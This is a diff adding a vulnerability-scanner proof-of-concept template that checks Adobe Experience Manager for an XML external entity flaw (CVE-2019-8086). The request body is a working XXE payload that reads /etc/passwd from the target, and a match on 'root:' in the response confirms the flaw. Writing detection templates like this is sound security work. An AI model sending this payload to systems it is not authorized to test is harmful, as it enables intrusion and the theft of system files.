@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "通过发送包含外部实体定义的 XML 请求，验证 Adobe Experience Manager 是否存在 XML 外部实体注入（XXE）漏洞。"
+id = "POC-AVE-2019-0196"
+name = "Adobe Experience Manager XXE PoC"
+severity = "high"
+tags = ["ave-2019-0196"]
+vuln_id = [
+    "CVE-2019-8086",
+    "AVE-2019-0196",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/xml"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
